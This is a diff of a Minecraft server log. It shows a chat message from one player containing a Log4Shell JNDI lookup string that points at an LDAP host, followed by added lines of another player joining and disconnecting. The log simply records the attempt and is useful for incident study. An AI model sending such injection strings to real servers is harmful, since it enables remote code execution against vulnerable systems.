@@ -194,3 +194,7 @@ org.bukkit.plugin.UnknownDependencyException: ProtocolLib
 [16:33:46] [Server thread/WARN]: handleDisconnection() called twice
 [16:35:37] [Async Chat Thread - #3/INFO]: <odragclicker> a
 [16:35:37] [Async Chat Thread - #2/INFO]: <odragclicker> ${jndi:ldap://192.168.255.255}
+[16:40:37] [Thread-13/INFO]: UUID of player ProHaxLeaks is 7ae292e8-c138-3b90-af4c-37ef05ba9a54
+[16:40:37] [Server thread/INFO]: ProHaxLeaks[/127.30.38.147:48089] logged in with entity id 60 at ([world]1437.5, 4.0, 42.5)
+[16:40:38] [Server thread/INFO]: ProHaxLeaks lost connection: Disconnected
+[16:40:38] [Server thread/INFO]: ProHaxLeaks left the game.
